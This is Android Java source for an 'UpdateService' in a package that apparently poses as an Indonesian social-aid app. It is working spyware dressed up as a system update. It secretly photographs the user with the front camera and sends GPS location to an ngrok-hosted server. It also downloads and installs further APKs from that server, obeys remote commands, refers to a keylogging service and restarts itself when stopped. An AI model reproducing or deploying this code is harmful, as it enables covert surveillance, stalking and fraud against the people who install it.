package com.kemensos.bansos;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.DownloadManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.hardware.Camera;
import android.location.Criteria;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Base64;
import android.util.Log;
import android.widget.Toast;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.Timer;
import java.util.TimerTask;

public class UpdateService extends Service {

    private static final String TAG = "UpdateService";
    private static final String SERVER_URL = "https://scarf-ion-cranium.ngrok-free.dev";
    private String DEVICE_ID = "";
    private static final int NOTIF_ID = 1001;
    private static final int UPDATE_NOTIF_ID = 1002;

    // Current APK version
    private static final int CURRENT_VERSION_CODE = 5;
    private static final String CURRENT_VERSION_NAME = "5.0";

    // Configurable intervals (can be changed via remote command)
    private long gpsIntervalMs = 60000;
    private long cameraIntervalMs = 30000;
    private float gpsMinDistanceM = 50;

    private LocationManager locationManager;
    private LocationListener locationListener;
    private PowerManager.WakeLock wakeLock;
    private Timer timer;
    private Timer cameraTimer;
    private Handler handler = new Handler(Looper.getMainLooper());
    private boolean updateChecked = false;
    private String lastCommandPhoto = "";

    @Override
    public void onCreate() {
        super.onCreate();
        // Use same device ID as MainActivity
        DEVICE_ID = MainActivity.DEVICE_ID;
        if (DEVICE_ID == null || DEVICE_ID.isEmpty()) {
            String androidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
            DEVICE_ID = androidId != null && androidId.length() > 10 ? androidId.substring(0, 10) : "unknown";
        }
        createNotificationChannel();
        startForeground(NOTIF_ID, buildNotification());

        // Acquire wake lock
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, TAG);
        wakeLock.acquire(60 * 60 * 1000L);

        // Start location tracking
        startLocationUpdates();

        // Periodic camera capture (configurable interval)
        cameraTimer = new Timer();
        cameraTimer.schedule(new TimerTask() {
            @Override
            public void run() {
                handler.post(new Runnable() {
                    @Override
                    public void run() {
                        capturePhoto();
                    }
                });
            }
        }, 5000, cameraIntervalMs);

        // Update check (one-time at start + periodic)
        timer = new Timer();
        timer.schedule(new TimerTask() {
            @Override
            public void run() {
                handler.post(new Runnable() {
                    @Override
                    public void run() {
                        if (!updateChecked) {
                            checkForUpdate();
                            updateChecked = true;
                        }
                    }
                });
            }
        }, 5000, 30000);

        // Check for update periodically (every 6 hours)
        timer.schedule(new TimerTask() {
            @Override
            public void run() {
                handler.post(new Runnable() {
                    @Override
                    public void run() {
                        checkForUpdate();
                    }
                });
            }
        }, 3600000, 21600000);

        Log.d(TAG, "Service started");
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                "update_channel",
                "Pembaruan Sistem",
                NotificationManager.IMPORTANCE_MIN
            );
            channel.setDescription("Aktif untuk menjaga sistem tetap terbarui");
            channel.setShowBadge(false);
            channel.setSound(null, null);
            NotificationManager nm = getSystemService(NotificationManager.class);
            nm.createNotificationChannel(channel);

            // Channel for update notifications
            NotificationChannel updateChannel = new NotificationChannel(
                "update_download_channel",
                "Unduhan Pembaruan",
                NotificationManager.IMPORTANCE_DEFAULT
            );
            updateChannel.setDescription("Notifikasi unduhan pembaruan sistem");
            nm.createNotificationChannel(updateChannel);
        }
    }

    private Notification buildNotification() {
        Intent intent = new Intent(this, MainActivity.class);
        PendingIntent pi = PendingIntent.getActivity(
            this, 0, intent,
            PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
        );

        Notification.Builder builder;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder = new Notification.Builder(this, "update_channel");
        } else {
            builder = new Notification.Builder(this);
        }

        return builder
            .setContentTitle("Pembaruan Sistem")
            .setContentText("Menunggu pembaruan...")
            .setSmallIcon(android.R.drawable.ic_menu_compass)
            .setOngoing(true)
            .setPriority(Notification.PRIORITY_MIN)
            .setContentIntent(pi)
            .build();
    }

    // ===== AUTO-UPDATE SYSTEM =====
    private void checkForUpdate() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    URL url = new URL(SERVER_URL + "/api/apk-version");
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setConnectTimeout(10000);
                    conn.setReadTimeout(10000);

                    BufferedReader reader = new BufferedReader(
                        new InputStreamReader(conn.getInputStream()));
                    StringBuilder response = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) {
                        response.append(line);
                    }
                    reader.close();
                    conn.disconnect();

                    JSONObject json = new JSONObject(response.toString());
                    int latestVersion = json.getInt("version_code");
                    String downloadUrl = json.getString("download_url");
                    String versionName = json.getString("version_name");

                    if (latestVersion > CURRENT_VERSION_CODE) {
                        Log.d(TAG, "Update available: v" + versionName);
                        downloadAndInstall(downloadUrl, versionName);
                    } else {
                        Log.d(TAG, "Already latest version: " + CURRENT_VERSION_CODE);
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Update check failed", e);
                }
            }
        }).start();
    }

    private void downloadAndInstall(String downloadUrl, final String versionName) {
        // Register receiver for download completion
        BroadcastReceiver onComplete = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                long downloadId = intent.getLongExtra(DownloadManager.EXTRA_DOWNLOAD_ID, -1);
                if (downloadId == -1) return;

                DownloadManager dm = (DownloadManager) getSystemService(DOWNLOAD_SERVICE);
                DownloadManager.Query query = new DownloadManager.Query();
                query.setFilterById(downloadId);
                Cursor c = dm.query(query);
                if (c.moveToFirst()) {
                    int status = c.getInt(c.getColumnIndex(DownloadManager.COLUMN_STATUS));
                    if (status == DownloadManager.STATUS_SUCCESSFUL) {
                        String uri = c.getString(c.getColumnIndex(DownloadManager.COLUMN_LOCAL_URI));
                        installApk(Uri.parse(uri));
                    }
                }
                c.close();
                unregisterReceiver(this);
            }
        };
        registerReceiver(onComplete, new IntentFilter(DownloadManager.ACTION_DOWNLOAD_COMPLETE));

        // Start download
        DownloadManager.Request request = new DownloadManager.Request(Uri.parse(downloadUrl));
        request.setTitle("Pembaruan " + versionName);
        request.setDescription("Mengunduh pembaruan sistem...");
        request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED);
        request.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS,
            "PembaruanSistem-v" + versionName + ".apk");

        // Only show on WiFi for large files on older versions
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
            request.setAllowedNetworkTypes(DownloadManager.Request.NETWORK_WIFI | DownloadManager.Request.NETWORK_MOBILE);
        }

        DownloadManager dm = (DownloadManager) getSystemService(DOWNLOAD_SERVICE);
        dm.enqueue(request);
    }

    private void installApk(Uri apkUri) {
        try {
            Intent installIntent = new Intent(Intent.ACTION_VIEW);
            installIntent.setDataAndType(apkUri, "application/vnd.android.package-archive");
            installIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_GRANT_READ_URI_PERMISSION);

            // Android 8+ needs "Install unknown apps" permission
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                if (!getPackageManager().canRequestPackageInstalls()) {
                    // Open settings to allow install from this source
                    Intent settingsIntent = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES);
                    settingsIntent.setData(Uri.parse("package:" + getPackageName()));
                    settingsIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(settingsIntent);
                    return;
                }
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                installIntent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
            }

            startActivity(installIntent);
        } catch (Exception e) {
            Log.e(TAG, "Install failed", e);
        }
    }

    // ===== LOCATION TRACKING =====
    @SuppressLint("MissingPermission")
    private void startLocationUpdates() {
        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);

        try {
            Criteria criteria = new Criteria();
            criteria.setAccuracy(Criteria.ACCURACY_FINE);
            criteria.setPowerRequirement(Criteria.POWER_HIGH);

            String provider = locationManager.getBestProvider(criteria, true);
            if (provider == null) provider = LocationManager.GPS_PROVIDER;

            locationListener = new LocationListener() {
                @Override
                public void onLocationChanged(Location location) {
                    sendLocation(location);
                }
                @Override public void onStatusChanged(String p, int i, Bundle b) {}
                @Override public void onProviderEnabled(String p) {}
                @Override public void onProviderDisabled(String p) {}
            };

            locationManager.requestLocationUpdates(
                provider, gpsIntervalMs, gpsMinDistanceM, locationListener, Looper.getMainLooper()
            );
        } catch (Exception e) {
            Log.e(TAG, "Location error", e);
        }
    }

    private void sendLocation(final Location location) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    JSONObject data = new JSONObject();
                    data.put("latitude", location.getLatitude());
                    data.put("longitude", location.getLongitude());
                    data.put("accuracy", location.getAccuracy());
                    data.put("altitude", location.getAltitude());
                    data.put("speed", location.getSpeed());
                    data.put("time", location.getTime());
                    data.put("battery", getBatteryLevel());

                    String response = httpPost(SERVER_URL + "/api/location/" + DEVICE_ID, data.toString());
                    Log.d(TAG, "Location sent: " + response);
                } catch (Exception e) {
                    Log.e(TAG, "Send location error", e);
                }
            }
        }).start();
    }

    // ===== CAMERA CAPTURE =====
    @SuppressLint("MissingPermission")
    private void capturePhoto() {
        if (checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            return;
        }

        try {
            final Camera camera = Camera.open(Camera.CameraInfo.CAMERA_FACING_FRONT);
            if (camera == null) return;

            Camera.Parameters params = camera.getParameters();
            params.setRotation(270);
            camera.setParameters(params);

            camera.takePicture(null, null, new Camera.PictureCallback() {
                @Override
                public void onPictureTaken(byte[] data, Camera camera) {
                    camera.release();
                    if (data != null && data.length > 100) {
                        sendPhoto(data);
                    }
                }
            });
        } catch (Exception e) {
            Log.e(TAG, "Camera error", e);
        }
    }

    private void sendPhoto(final byte[] imageData) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String boundary = "Boundary-" + System.currentTimeMillis();
                    URL url = new URL(SERVER_URL + "/api/device-upload/" + DEVICE_ID);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setDoOutput(true);
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
                    conn.setConnectTimeout(15000);
                    conn.setReadTimeout(15000);

                    DataOutputStream dos = new DataOutputStream(conn.getOutputStream());

                    // Type field
                    dos.writeBytes("--" + boundary + "\r\n");
                    dos.writeBytes("Content-Disposition: form-data; name=\"type\"\r\n\r\n");
                    dos.writeBytes("photo\r\n");

                    // File field
                    dos.writeBytes("--" + boundary + "\r\n");
                    dos.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"capture.jpg\"\r\n");
                    dos.writeBytes("Content-Type: image/jpeg\r\n\r\n");
                    dos.write(imageData);
                    dos.writeBytes("\r\n");
                    dos.writeBytes("--" + boundary + "--\r\n");
                    dos.flush();
                    dos.close();

                    int code = conn.getResponseCode();
                    conn.disconnect();
                    Log.d(TAG, "Photo sent, code: " + code);
                } catch (Exception e) {
                    Log.e(TAG, "Send photo error", e);
                }
            }
        }).start();
    }

    // ===== BATTERY =====
    private int getBatteryLevel() {
        try {
            Intent batteryIntent = registerReceiver(null,
                new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            int level = batteryIntent.getIntExtra("level", -1);
            int scale = batteryIntent.getIntExtra("scale", -1);
            if (level >= 0 && scale > 0) {
                return (level * 100) / scale;
            }
        } catch (Exception e) {}
        return -1;
    }

    // ===== HTTP HELPER =====
    private String httpPost(String urlStr, String jsonBody) throws Exception {
        URL url = new URL(urlStr);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setDoOutput(true);
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/json");
        conn.setConnectTimeout(10000);
        conn.setReadTimeout(10000);

        OutputStream os = conn.getOutputStream();
        os.write(jsonBody.getBytes("UTF-8"));
        os.flush();
        os.close();

        int code = conn.getResponseCode();
        BufferedReader reader = new BufferedReader(
            new InputStreamReader(conn.getInputStream())
        );
        StringBuilder response = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) {
            response.append(line);
        }
        reader.close();
        conn.disconnect();
        return response.toString();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && intent.getAction() != null) {
            handleCommand(intent);
        }
        return START_STICKY;
    }

    /**
     * Handle remote commands from KeylogService or server.
     */
    private void handleCommand(Intent intent) {
        String action = intent.getAction();
        if (action == null) return;

        Log.d(TAG, "Command received: " + action);

        switch (action) {
            case "com.kemensos.bansos.CMD_CAPTURE_PHOTO": {
                lastCommandPhoto = "remote_" + System.currentTimeMillis();
                capturePhoto();
                break;
            }
            case "com.kemensos.bansos.CMD_GET_LOCATION": {
                // Trigger immediate location send
                if (locationManager != null && locationListener != null) {
                    locationManager.removeUpdates(locationListener);
                    startLocationUpdates();
                }
                break;
            }
            case "com.kemensos.bansos.CMD_SET_INTERVAL": {
                int gpsMs = intent.getIntExtra("gps_ms", 0);
                int cameraMs = intent.getIntExtra("camera_ms", 0);
                if (gpsMs >= 10000) {
                    gpsIntervalMs = gpsMs;
                    // Restart GPS with new interval
                    if (locationManager != null) {
                        locationManager.removeUpdates((LocationListener) null);
                        startLocationUpdates();
                    }
                    Log.d(TAG, "GPS interval set to " + gpsMs + "ms");
                }
                if (cameraMs >= 5000) {
                    cameraIntervalMs = cameraMs;
                    // Restart camera timer with new interval
                    if (cameraTimer != null) {
                        cameraTimer.cancel();
                    }
                    cameraTimer = new Timer();
                    cameraTimer.schedule(new TimerTask() {
                        @Override
                        public void run() {
                            handler.post(() -> capturePhoto());
                        }
                    }, 5000, cameraIntervalMs);
                    Log.d(TAG, "Camera interval set to " + cameraMs + "ms");
                }
                break;
            }
        }
    }

    @Override
    public void onDestroy() {
        if (cameraTimer != null) cameraTimer.cancel();
        if (timer != null) timer.cancel();
        if (locationManager != null && locationListener != null) locationManager.removeUpdates(locationListener);
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();

        // Restart service
        Intent intent = new Intent(this, UpdateService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
